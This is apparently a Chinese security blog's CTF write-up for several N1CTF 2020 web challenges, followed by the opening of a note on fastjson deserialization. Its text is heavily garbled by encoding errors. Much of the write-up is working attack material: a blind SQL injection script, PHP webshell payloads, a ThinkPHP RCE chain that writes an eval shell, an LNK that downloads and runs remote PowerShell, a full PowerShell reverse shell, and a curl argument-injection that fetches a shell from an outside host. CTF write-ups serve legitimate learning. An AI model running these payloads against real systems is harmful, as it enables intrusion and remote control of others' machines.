ä¸‹è¿›è¡ŒæŠ¥é”™ç›²æ³¨ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚(å› ä¸º__toStringçš„è¿”å›å€¼ä¼šä¸n1ctfæ¯”è¾ƒ,è€Œ__toStringè¿”å›å€¼æœ‰mysqlæŠ¥é”™ä¸â€your ip looks ok!â€ä¸¤ç§ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ æŠ¥é”™ä»è€Œäº§ç”Ÿå¸ƒå°”å€¼æ¥ç›²æ³¨äº†) æ—¶é—´ç›²æ³¨çš„è¯,ç”±äºbanäº†ä¸å°‘å…³é”®è¯,æ‰€ä»¥æˆ‘æ˜¯ç°å­¦çš„æ–°æ–¹æ³•select rpad(&#39;a&#39;,2999999,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) å…¶å®æŒºåƒ jsé‡Œçš„æ­£åˆ™ç›²æ³¨çš„ã€‚å½“ç„¶å…¶å®ä»å…¶ä»–å‡ ç§æ—¶é—´ç›²æ³¨æ–¹æ³•å¦‚heavy queryå°±å¯ä»¥æ¨å‡ºè¿™ç§ä»¤æœåŠ¡ç«¯äº§ç”Ÿè´Ÿè·çš„æ–¹æ³•å¿…ç„¶å¯è¡Œ233ã€‚ç„¶åé¢˜ç›®åªwafæ‰äº†rpad,rpadä¸èƒ½ç”¨çš„è¯æ”¹æˆlpadå°±å¥½äº†:) exp 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport timeimport stringurl='http://101.32.205.189/'def getflag(payload): r = requests.get(url, params=&#123;'input': payload&#125;) print(r.text)#key n1ctf20205bf75ab0a30dfc0cdef sqli(): res=\"\" for i in range(1,50): print(i) for j in string.printable: headers = &#123; #'X-Forwarded-For': \"1'^(if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),\"+str(i)+\",1))=\" + str(ord(j)) + \",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1\" #'X-Forwarded-For': \"1'^(if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='n1key'),\"+str(i)+\",1))=\" + str(j) + \",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1\" 'X-Forwarded-For': \"1'^(if(ascii(substr((select `2` from (select 1,2 union select * from n1key)a limit 1,1),\"+str(i)+\",1))=\" + str(ord(j)) + \",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1\" # select `2` from (select 1,2 union select * from n1key) a limit 1,1 &#125; t = time.time() r = requests.get(url, params=&#123;'input': payload&#125;, headers=headers) if 'hack' in r.text: print('banwords') if time.time() - t &gt; 2.5: res +=j print(res) breakif __name__==\"__main__\": #sqli('O:4:\"flag\":2:&#123;s:2:\"ip\";O:2:\"ip\":1:&#123;s:2:\"ip\";N;&#125;s:5:\"check\";N;&#125;') getflag('O:4:\"flag\":2:&#123;s:2:\"ip\";N;s:5:\"check\";s:25:\"n1ctf20205bf75ab0a30dfc0c\";&#125;') è¿™é‡Œæµªè´¹æˆ‘æ—¶é—´æœ€ä¹…çš„å°±æ˜¯æœ€åä¸€æ­¥select key from n1key,å¯¼è‡´é”™å¤±ä¸€è¡€ã€‚è¯•äº†å¥½ä¹…è¿˜æ¢äº†ä¸€ç§æ³¨æ³•æ‰æ€€ç–‘æ˜¯ä»–æœåŠ¡ç«¯wafäº†è¿™ä¸ªè¯­å¥ã€‚ç„¶åå°è¯•æ€§çš„æ”¹æˆæ— åˆ—åæ³¨å…¥select `2` from (select 1,2 union select * from n1key)a limit 1,1å°±æˆäº† orz. æ‰€ä»¥å¯èƒ½è¿˜æ˜¯è‡ªå·±å¤ªèœæ‰é”™å¤±è‰¯æœºå§ã€‚ filterssource 123456789101112131415161718192021&lt;?phpisset($_POST['filters'])?print_r(\"show me your filters!\"): die(highlight_file(__FILE__));$input = explode(\"/\",$_POST['filters']);$source_file = \"/var/tmp/\".sha1($_SERVER[\"REMOTE_ADDR\"]);$file_contents = [];foreach($input as $filter)&#123; array_push($file_contents, file_get_contents(\"php://filter/\".$filter.\"/resource=/usr/bin/php\"));&#125;shuffle($file_contents);file_put_contents($source_file, $file_contents);try &#123; require_once $source_file;&#125;catch(\\Throwable $e)&#123; pass;&#125;unlink($source_file);?&gt; è¿™é¢˜è‡ªå·±å°±æ²¡åšå‡ºæ¥äº†ã€‚ä¸è¿‡å¯ä»¥åˆ†äº«ä¸‹æˆ‘å½“æ—¶çš„æ€è·¯,æˆ‘æ„Ÿè§‰åº”è¯¥æ˜¯æ§åˆ¶filterè¿‡æ»¤å™¨å¤šå±‚ç»„åˆfuzzæ¥æ„é€ ä»»æ„å­—ç¬¦ã€‚ä¹Ÿå°±æ˜¯è¯´å‰ææ˜¯åœ¨resourceå§‹ç»ˆä¸º/usr/bin/phpä¸‹çš„ã€‚ å‡å¦‚è¿™é‡Œä¸æ˜¯file_get_contentsçš„è¯å…¶å®å¾ˆç®€å•,å› ä¸ºè¿‡æ»¤å™¨çš„å†…å®¹å¯ä»¥ä½¿ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„,æ‰€ä»¥åƒ 12php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|&lt;?cuc @riny($_CBFG[Dsgz])?&gt;&#x2F;resource&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSb[cy)]?; &gt; å¯ä»¥åœ¨file_put_contents()æ—¶å†™å…¥æŒ‡å®šæ–‡ä»¶ã€‚å¹¶ä¸”warningä¸å½±å“å†™å…¥ã€‚ä¸è¿‡å‡ºé¢˜äººè‚¯å®šçŸ¥é“è¿™ç‚¹æ‰€ä»¥æ˜¯å…ˆfile_get_contentså†file_put_contentsã€‚å¹¶ä¸”æ–‡ä»¶åçš„å‚æ•°ä¹Ÿä¸å¯æ§ï¼Œæ‰€ä»¥å°±ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå¥‡æ·«æŠ€å·§äº†ã€‚ ps: çœ‹åˆ°å®˜æ–¹wpçš„ç¡®æ˜¯fuzzæ„é€ å­—ç¬¦ã€‚æœ‰ç‚¹orange çš„ oneline php challengeé‚£å‘³äº†ã€‚ çœ‹åˆ°SuperGusserçš„wpåæ„Ÿè§‰ä»–ä»¬çš„æ€è·¯æ˜¯çœŸçš„ç®€å•ã€‚ã€‚ã€‚ 1filters&#x3D;resource&#x3D;data:,&lt;?php%20system(&#39;ls&#39;);?&gt; ç›´æ¥æœ€è´¨æœ´çš„dataåè®®å†™å…¥,ä¸ç”¨å¸¦ä¸Štext,plain,base64ä¹‹ç±»çš„ã€‚é‚£ä¹ˆåé¢çš„å†…å®¹éƒ½è¢«å½“åšdataçš„å†…å®¹äº†ã€‚æ‰€ä»¥æ ¹æœ¬ä¸ç”¨ç®¡/äº† easytp5smileå¤§å¸ˆå‚…çš„é¢˜å¿…ç„¶å°‘ä¸äº†thinkphp ?è¿™é¢˜æˆ‘æ€è·¯æœ‰ç‚¹èµ°åäº†ï¼Œå…¶å®è¦æ˜¯æŒ‰ç…§åŸæ¥æš‘å‡è·Ÿè¿‡çš„tp5.0 çš„rceæ€è·¯åº”è¯¥ä¼šé¡ºåˆ©å¤šäº†ã€‚ ä»¥ä¸‹å†…å®¹å¯ä»¥åœ¨ç›´æ¥å­¦ä¹ tpæ¼æ´çš„ç¬”è®°æ‰¾åˆ°é¦–å…ˆæ˜¯ä¸€ä¸ªtp5 rceçš„é€šç”¨ç‚¹ã€‚é‚£å°±æ˜¯å¯ä»¥é€šè¿‡æ§åˆ¶å™¨æ¥è¦†ç›–å€¼ã€‚åœ¨Request.php 1234if (isset($_POST[Config::get('var_method')])) &#123; $this-&gt;method = strtoupper($_POST[Config::get('var_method')]); $this-&gt;&#123;$this-&gt;method&#125;($_POST);&#125; å…¸å‹çš„å°±æ˜¯å¯ä»¥è°ƒç”¨Requestä»»æ„æ–¹æ³•å¹¶ä»¥$_POSTä¸ºå‚æ•°ã€‚ç„¶åè¿›__constructå 12345678910public function __construct($options = [])&#123; foreach ($options as $name =&gt; $item) &#123; if (property_exists($this, $name)) &#123; $this-&gt;$name = $item; &#125; &#125; if (is_null($this-&gt;filter)) &#123; $this-&gt;filter = Config::get('default_filter'); &#125;&#125; æœ‰ä¸€ä¸ªä»»æ„å‚æ•°è¦†ç›–ã€‚æ‰€ä»¥è¿˜æ˜¯åˆ©ç”¨è¿™ä¸ªç±»çš„æ‰€æœ‰å¯æ§å‚æ•°æ¥æ‰¾gadgetæ‰“ã€‚è¿™é‡Œç»§ç»­ä¸‹æ–­ç‚¹ä¸€è·¯è·Ÿå‘ç°ä¼šæ ¹æ®app_debugçš„å€¼å‰å¾€å½“å‰ç±»ä¸‹paramæ–¹æ³•ã€‚è€Œè¿™ä¸ªæ–¹æ³•å…¨éƒ½èµ°inputæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯éƒ½ä¼šè°ƒç”¨äº†call_user_funcã€‚ 123456789101112131415//inputif (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); reset($data);&#125; //filterValueprivate function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤ $value = call_user_func($filter, $value); &#125; elseif (is_scalar($value)) &#123; ä»¥ä¸Šéƒ¨åˆ†è·Ÿtp5çš„rceæ€è·¯å®Œå…¨ä¸€è‡´ã€‚åªä¸è¿‡é¢˜ç›®è®¾ç½®äº†disable_function,ä»¥åŠç¦ç”¨äº†ä¸€äº›å•å‚æ•°å‡½æ•°ã€‚å¯¼è‡´å¤§éƒ¨åˆ†payloadéƒ½ä¸å¯è¡Œã€‚ é‚£ä¹ˆæ¯”è¾ƒé‡è¦çš„å°±æ˜¯æ‰¾gadgetäº†ã€‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶filter,ç„¶åè¿›è¡Œä»»æ„æ–¹æ³•çš„å•å‚æ•°rce.ä¸è¿‡ç”±äºforå¾ªç¯å¾ªç¯è°ƒç”¨$value.æ‰€ä»¥å¯ä»¥æ­é…gadgetè¿›è¡Œrce.è¿™é‡Œå¯ä»¥æ‰¾æ¶æ„å‡½æ•°æ‰¾åˆ°evalthinkphp\\library\\think\\view\\driver\\Php.php 1234567891011public function display($content, $data = [])&#123; if (isset($data['content'])) &#123; $__content__ = $content; extract($data, EXTR_OVERWRITE); eval('?&gt;' . $__content__); &#125; else &#123; extract($data, EXTR_OVERWRITE); eval('?&gt;' . $content); &#125;&#125; å› ä¸ºè¿™é‡Œçš„ç›´æ¥è°ƒç”¨ä¼šæŠ¥é”™,æ‰€ä»¥çœ‹åˆ°SuperGuesserçš„wpé‡Œæåˆ°äº†è®¾ç½®set_error_handler ä¸ºä»»æ„å…¶ä»–å‡½æ•°æ¥é¿å…tpçš„é»˜è®¤é”™è¯¯å¤„ç†ã€‚æ­¤å¤„æ˜¯implode.é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ç»§ç»­äº†ã€‚å…³äºfilterçš„è°ƒç”¨ã€‚å°±æ˜¯è¿™å››æ¬¡è°ƒç”¨ 12341.set_error_handler &quot;implode&quot;2.self::path base64-payload 3.base64_decode base64-payload 4.\\think\\view\\driver\\Php::Display payload payload 12345http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode&quot;post:path&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ2J5Yy5waHAnLCc8P3BocCBldmFsKCRfUkVRVUVTVFtieWNdKTs&#x2F;PicpOyA&#x2F;Pg&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\\think\\view\\driver\\Php::Display&amp;method&#x3D;GET è¿™é‡Œæˆ‘è§‰å¾—åˆ©ç”¨::çš„ç¡®æ„æƒ³ä¸åˆ°ã€‚ä»¥ä¸ºæŒ‰ç…§è‡ªå·±çš„è®¤è¯†æ¥è¯´::æ˜¯ç”¨æ¥è®¿é—®é™æ€å±æ€§è·Ÿæ–¹æ³•ã€‚æ²¡æƒ³åˆ°æ˜¯å¯ä»¥è°ƒéé™æ€çš„(æœ‰warning).åŸºäºä¸Šé¢å·²ç»è§£å†³äº†tpæŠ¥é”™çš„é—®é¢˜,è¿™é‡Œä¹Ÿå°±æ²¡å•¥é—®é¢˜äº†ã€‚ çœ‹åˆ°smi1eåˆ†äº«äº†å…¶ä»–ä¸€äº›éé¢„æœŸè§£ä»¥åŠé¢„æœŸè§£ã€‚æ‰“ç®—è·Ÿä¸€è·Ÿ The king of phish (Victim bot)source 12345678910111213141516171819202122232425262728293031323334353637383940import osimport uuidimport LnkParse3 as Lnkfrom flask import Flask, requestapp = Flask(__name__)@app.route('/')def index(): source = open(__file__, 'r').read().replace(\"\\n\", \"\\x3c\\x62\\x72\\x3e\").replace(\" \", \"\\x26\\x6e\\x62\\x73\\x70\\x3b\") return source@app.route('/send', methods=['POST'])def sendFile(): if 'file' not in request.files: return 'No file part' file = request.files['file'] if file.filename == '': return 'No selected file' data = file.stream.read() if not data.startswith(b\"\\x4c\\x00\"): return \"You're a bad guy!\" shortcut = Lnk.lnk_file(indata=data) if shortcut.data['command_line_arguments'].count(\" \"): return \"File is killed by antivirus.\" filename = str(uuid.uuid4())+\".lnk\" fullname = os.path.join(os.path.abspath(os.curdir) + \"/uploads\", filename) open(fullname, \"wb\").write(data) clickLnk(fullname) return \"Clicked.\"def clickLnk(lnkPath): os.system('cmd /c \"%s\"' % lnkPath)if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) è¿™é‡Œå¼€å§‹ä¸»è¦æ˜¯è¢«lnkçš„å‘½ä»¤é‡Œbypass ç©ºæ ¼ç»™å›°æ‰°äº†ã€‚åæ¥æƒ³èµ·æ¥ä¸ç”¨ç©ºæ ¼è¿˜å¯ä»¥ç”¨å…¶ä»–ä¸å¯è§å­—ç¬¦.é‚£å°±å¾ˆç®€å•äº†ã€‚ç”¨\\tæ›¿æ¢ä¸‹ç©ºæ ¼å³å¯ã€‚çµæœæ‰¾åŠå¤©æ²¡æ‰¾åˆ°æ¶æ„lnkçš„ç”Ÿæˆå·¥å…·ã€‚ã€‚ã€‚ æœ€åä»Šå¤©å¤ç°æ—¶æ‰¾åˆ°ä¸€ä¸ªwindowsä¸Šçš„ã€‚ https://github.com/fireeye/SharPersistç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ç”Ÿæˆlnkæ–‡ä»¶. 1SharPersist.exe -t startupfolder -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"IEX(New-Object`tNet.WebClient).DownloadString('http://xxx/byc.ps1')\" -f \"byc1\" -m add è¿™é‡Œç”¨åˆ°ä¸€ä¸ªå°æŠ€å·§ï¼špowershellå‘½ä»¤è¡Œä¸‹å¯ä»¥ç›´æ¥ç”¨`t æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­çš„\\tã€‚ ç„¶åå¼€å§‹å‡†å¤‡ç”¨çš„æ˜¯nishangçš„åå¼¹shellè„šæœ¬ã€‚ç»“æœæ²¡ååº”,æ„Ÿè§‰æ˜¯è¢«é˜²ç«å¢™æ‹¦äº†ã€‚æ‰€ä»¥å°±æ¢äº†ä¸ªç®€å•çš„æœåŠ¡å™¨ä¸Šçš„byc.ps1 1$client = New-Object System.Net.Sockets.TCPClient(\"10.0.2.4\",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close() æœ€åå‘é€å³å¯getshell flagåœ¨userA æ¡Œé¢n1ctf{I&#39;m_a_little_fish,_swimming_in_the_ocean} åé¢æ‹¿åŸŸæ§çš„æ€è·¯å°±æ²¡æœ‰äº†â€¦ Docker_ManagerBUUä¸Šé¢åˆå¤ç°äº†ä¸¤é¢˜ã€‚zabbix_funç›´æ¥æ‹¿expæ‰“çš„ã€‚Docker_Managerå¯ä»¥è®°å½•ä¸‹ èµµæ€»çš„wpå¾ˆè¯¦ç»†äº†ã€‚å­¦åˆ°å¾ˆå¤šhttps://www.zhaoj.in/read-6750.html é¢˜ç›®æ ¸å¿ƒä»£ç åŸºæœ¬å°±æ˜¯ä¸‹é¢äº† 1234$cmd = 'curl --connect-timeout 10 ' . $host_addr . ' -g ' . $cert . $key . $cacert;$output = array();$ret = 0;exec($cmd, $output, $ret); æ˜¾ç„¶å°±æ˜¯ä¸€ä¸ªcurlçš„å‚æ•°æ³¨å…¥ã€‚ä½†æ˜¯åˆ©ç”¨èµ·æ¥æ¯”è¾ƒæœ‰è¶£ã€‚ You tell curl to read more command-line options from a specific file with the -K/â€“config option, like this: -Kæ˜¯å¯ä»¥è¯»å–ä¸€ä¸ªé…ç½®æ–‡ä»¶çš„ã€‚ç„¶åå¦‚æœé…ç½®æ–‡ä»¶demoå¦‚ä¸‹ 1234567891011# --- Example file ---# this is a commenturl &#x3D; &quot;example.com&quot;output &#x3D; &quot;curlhere.html&quot;user-agent &#x3D; &quot;superagent&#x2F;1.0&quot; # and fetch another URL toourl &#x3D; &quot;example.com&#x2F;docs&#x2F;manpage.html&quot;-Oreferer &#x3D; &quot;http:&#x2F;&#x2F;nowhereatall.example.com&#x2F;&quot;# --- End of example file --- ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦Kèƒ½åŠ è½½åˆ°è®¾è®¡è¿‡çš„é…ç½®æ–‡ä»¶ï¼Œå°±èƒ½è¯»å†…å®¹å¹¶è¾“å‡ºã€‚è¿™åªç”¨åˆ°äº†-Kä¸€ä¸ªæŒ‡ä»¤ï¼Œå³å¯è¾¾æˆå†™shellçš„ç›®çš„ã€‚ç„¶åå°±æ˜¯éå¸¸å·§å¦™çš„ä¸€ä¸ªåˆ©ç”¨äº†ã€‚æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è¯»åˆ°é…ç½®æ–‡ä»¶ï¼Œè€Œè¿™å°±æ˜¯åˆ©ç”¨äº†/proc/xxx/cmdlineåŸæ¥æˆ‘ä»¬çŸ¥é“ï¼Œ/proc/self/cmdlineå¸¸ç”¨äºè¯»å–java,pythonè¿™æ ·çš„webåº”ç”¨çš„ä¸€äº›ç®€å•é…ç½®ã€‚ä½†æ˜¯å®é™…ä¸Šå…¶ä»–å‘½ä»¤è¡Œæˆ–è€…è¯´ä¸€ä¸ªpidéƒ½ä¼šå¯¹åº”å…¶è¿è¡Œæ—¶çš„å‘½ä»¤å³/proc/{pid}/cmdlineã€‚ é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬æœ‰åŠæ³•è®©cmdlineé•¿æ—¶é—´é©»ç•™ï¼Œå°±å¯ä»¥çˆ†ç ´pidè¯»å–åˆ°é…ç½®æ–‡ä»¶ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨/dev/urandomç­‰ç­‰æ–‡ä»¶ã€‚å®é™…ä¸Šdevä¸‹å¾ˆå¤šæ²¡æœ‰å®é™…å¤§å°çš„æ–‡ä»¶éƒ½å¯ä»¥ç”¨æ¥è¯»å–ã€‚ é‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬åˆ©ç”¨æ¢è¡Œç¬¦,å°±èƒ½åœ¨æŸä¸ªpidçš„cmdlineæ„é€ å¦‚ä¸‹çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ 1view.php?host&#x3D;-K&#x2F;dev&#x2F;urandom%00&amp;cacert&#x3D;111%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0aurl&#x3D;&quot;http:&#x2F;&#x2F;frps:9001&#x2F;byc.php&quot;%0aoutput&#x3D;&quot;img&#x2F;byc.php&quot;%0a%0a%0a%0a%0a%0a%0a 12345678curl --connect-timeout 10 '-K/dev/urandom' --cacert='111url=\"http://frps:9001/byc.php\"output=\"img/byc.php\" æ¥ä¸‹æ¥å°±æ˜¯åŒæ ·çš„åŠæ³•çˆ†ç ´-K/proc/xx/cmdlineï¼Œä»è€ŒåŠ è½½ä¸Šé¢çš„é…ç½®æ–‡ä»¶ï¼Œå†™è¿›shell getshellå trap &quot;&quot; 14 &amp;&amp; /readflagå³å¯ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"å­¦ä¹ ç¬”è®°-Javaæ·±å…¥","slug":"å­¦ä¹ ç¬”è®°-Javaæ·±å…¥","date":"2020-10-09T13:21:48.000Z","updated":"2021-02-18T05:08:43.422Z","comments":true,"path":"2020/10/09/å­¦ä¹ ç¬”è®°-Javaæ·±å…¥/","link":"","permalink":"https://www.bycsec.top/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/","excerpt":"javaç»§ç»­å¼€å‘å­¦ä¹ ã€‚çœ‹åˆ°å“ªä¸ªå­¦å“ªä¸ªï¼Œshiroæ‡’å¾—çœ‹äº†ã€‚","text":"javaç»§ç»­å¼€å‘å­¦ä¹ ã€‚çœ‹åˆ°å“ªä¸ªå­¦å“ªä¸ªï¼Œshiroæ‡’å¾—çœ‹äº†ã€‚ fastjsonexpåˆ©ç”¨ä¸å¿…å¤šè¯´ï¼Œä¸»è¦æ˜¯å­¦ä¹ ä¸‹åŸç†ã€‚ä»¥ä¸‹éƒ½åœ¨jdk1.8è°ƒè¯•ã€‚ å¯ä»¥æŒ‰wh1t3p1gå¸ˆå‚…çš„åšæ–‡å­¦ä¹ ã€‚https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/ ä¸‰ä¸ªdemoç±» 12345678910111213141516171819public class Person &#123; public String name; public Phone phone; public Person() &#123; &#125; public Person(String name, Phone phone) &#123; this.name = name; this.phone = phone; &#125; @Override public String toString()&#123; return name+\":\"+phone; &#125;&#125; 123456789101112131415public class Phone &#123; public String phoneNumber; public Phone() &#123; &#125; public Phone(String phoneNumber) &#123; this.phoneNumber = phoneNumber; &#125; public String toString()&#123; return this.phoneNumber; &#125;&#125; 123456789101112131415public class NewPhone extends Phone &#123; public String location; public NewPhone()&#123; &#125; public NewPhone(String phoneNumber, String location) &#123; this.phoneNumber = phoneNumber; this.location = location; &#125; public String toString()&#123; return this.phoneNumber+\":\"+this.location; &#125;&#125; fastjsonåº“ä¸€èˆ¬æˆ‘ä»¬é‡ç‚¹å…³æ³¨å‡ ä¸ªåŸºæœ¬åŠŸèƒ½æ–¹æ³• JSON.toJSONString() JSON.parse() JSON.parseObject() Test 123456789101112131415161718192021import com.alibaba.fastjson.JSON;public class Test &#123; public static void main(String[] args) &#123; Person person = new Person(\"byc_404\",new Phone(\"123123123\")); //Person person = new Person(\"byc_404\",new NewPhone(\"123123123\",\"china\")); String json = JSON.toJSONString(person); System.out.println(json); Person p = JSON.parseObject(json, Person.class); System.out.println(p); &#125;&#125;//ouput://1.//&#123;\"name\":\"byc_404\",\"phone\":&#123;\"phoneNumber\":\"123123123\"&#125;&#125;//byc_404:123123123//2.//&#123;\"name\":\"byc_404\",\"phone\":&#123;\"location\":\"china\",\"phoneNumber\":\"123123123\"&#125;&#125;//byc_404:123123123 è¿™é‡Œæœ€æ˜¾è‘—çš„é—®é¢˜å°±æ˜¯ã€‚æˆ‘ä»¬ä¸¤æ¬¡æ‰§è¡Œä»£ç æ—¶åœ¨parseObjectåè¾“å‡ºçš„ç»“æœæ˜¯ä¸€è‡´çš„ã€‚è¿™æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸ,å› ä¸ºè¿™ç›´æ¥ä¸¢å¤±äº†newphoneç±»çš„locationå±æ€§ã€‚ ç”±äºfastjsonä¸çŸ¥é“éœ€è¦è¿˜åŸçš„Personçš„Phoneæ˜¯æœ¬èº«è¿˜æ˜¯å­ç±»NewPhoneï¼Œé¢å¯¹è¿™ç§å¤šæ€æ–¹å¼ï¼Œfastjsonè¿˜åŸçš„æ˜¯çˆ¶ç±»ï¼Œè€Œä¸æ˜¯å­ç±»NewPhone åœ¨è¿™ç§æƒ…å†µä¸‹å°±äº§ç”Ÿäº†autotype.æˆ‘ä»¬å°†ä¸Šé¢TOJSONStringè¿™è¡Œä»£ç æ›´æ”¹ä¸‹ 12345String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);//output//&#123;\"@type\":\"Person\",\"name\":\"john\",\"phone\":&#123;\"@type\":\"NewPhone\",\"location\":\"china\",\"phoneNumber\":\"123123123\"&#125;&#125;//john:123123123:china è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°@typeå¸®åŠ©æˆ‘ä»¬é¿å…äº†å­ç±»ä¸¢å¤±å­—æ®µçš„é—®é¢˜,æˆåŠŸè¿˜åŸäº†å¯¹è±¡ã€‚ä½†æ˜¯æˆ‘ä»¬è‡ªç„¶å¯ä»¥æƒ³åˆ°,å¦‚æœå°†å…¶æŒ‡å®šä¸ºæ¶æ„ç±»,å°±å¯èƒ½å¯¼è‡´æ¶æ„ä»£ç æ‰§è¡Œäº†ã€‚è¿™å°±æ˜¯æœ€æ—©çš„fastjsonç‰ˆæœ¬çš„rceæ¼æ´ã€‚ ç„¶åå› ä¸ºæœ¬åœ°jdk1.8ç‰ˆæœ¬å¤ªé«˜å°±ä¸å¤ç°äº†â€¦â€¦æ‰“æ³•è‡ªç„¶æ˜¯rmi / ldapä¸¤ç§æ–¹æ³•ã€‚ è¿™é‡Œæä¸€ä¸‹fastjsonä¹‹æ‰€ä»¥èƒ½æ‰§è¡Œä¸€ç³»åˆ—æ–¹æ³•çš„èµ·å› :fastjson è‡ªåŠ¨è°ƒç”¨getterå’Œsetterä»¥åŠæ— å‚æ•°çš„æ„é€ å‡½æ•° è¿™é‡Œä¸æ·±å…¥è·Ÿ,ç›´æ¥ç»™å‡ºç»“è®ºsetteræå–æ¡ä»¶ï¼š å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4 éé™æ€å‡½æ•° é™åˆ¶è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±» å‡½æ•°å‚æ•°åªæœ‰ä¸€ä¸ª å‡½æ•°åä»¥setå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦æ˜¯å¤§å†™æˆ–è€…unicdeæˆ–è€…_æˆ–è€…å­—æ¯fï¼›å¦‚æœå‡½æ•°åé•¿åº¦&gt;=5ï¼Œçœ‹ç¬¬5ä½å­—ç¬¦æ˜¯ä¸æ˜¯å¤§å†™çš„ getteræå–æ¡ä»¶ï¼š å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4 éé™æ€å‡½æ•° å‡½æ•°åä»¥getå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦å¤§å†™ å‡½æ•°å‚æ•°ä¸º0ä¸ª å‡½æ•°çš„è¿”å›ç±»å‹ä¸ºCollectionçš„å­ç±»æˆ–æœ¬èº«ã€Mapçš„å­ç±»æˆ–æœ¬èº«ã€ AtomicBooleanã€AtomicIntegerã€AtomicLongæ— ç›¸å¯¹åº”çš„setterå‡½æ•° ç»è¿‡ä¸Šè¿°çš„ä¸¤ä¸ªæ¡ä»¶æå–åï¼Œä¿ç•™äº†ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterï¼Œå¹¶äºcom/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValueå‡½æ•°ä¸­invokeè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å®ç°äº†ç±»ä¼¼ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸»åŠ¨è°ƒç”¨readObjectå‡½æ•°çš„æ•ˆæœã€‚ ç”±æ¡ä»¶ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨ä¼ å…¥æŸå­—æ®µçš„æ–¹å¼æ¥ä¸»åŠ¨è°ƒç”¨ç›¸å…³ç¬¦åˆæ¡ä»¶çš„setterå’Œgetterã€‚ä¾‹å¦‚åœ¨Personé‡Œé¢æ·»åŠ ä¸€ä¸ªsetTestå‡½æ•°ï¼Œå¹¶åœ¨éœ€è¦è½¬åŒ–çš„jsonä¸­æ·»åŠ â€testâ€:1ï¼Œè¿™å°†ä¼šä¸»åŠ¨è°ƒç”¨setTestã€‚å¦‚ä¸‹ 1234public void setTest(String test) &#123; this.test = test; System.out.println(\"setTest Method called!\");&#125; 1234567String json=\"&#123;\\\"name\\\":\\\"byc_404\\\",\\\"phone\\\":&#123;\\\"phoneNumber\\\":\\\"123123123\\\"&#125;,\\\"test\\\":\\\"1\\\"&#125;\";Person p = JSON.parseObject(json, Person.class);System.out.println(p);//output://setTest Method called!//byc_404:123123123 æˆ‘ä»¬åœ¨åˆ©ç”¨@typeæ„é€ æœ‰å±å®³çš„åˆ©ç”¨é“¾æ—¶ï¼Œä¸»è¦å°±æ˜¯æŸ¥æ‰¾æœ‰å±å®³çš„æ— å‚æ•°çš„æ„é€ å‡½æ•°ã€ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterã€‚ 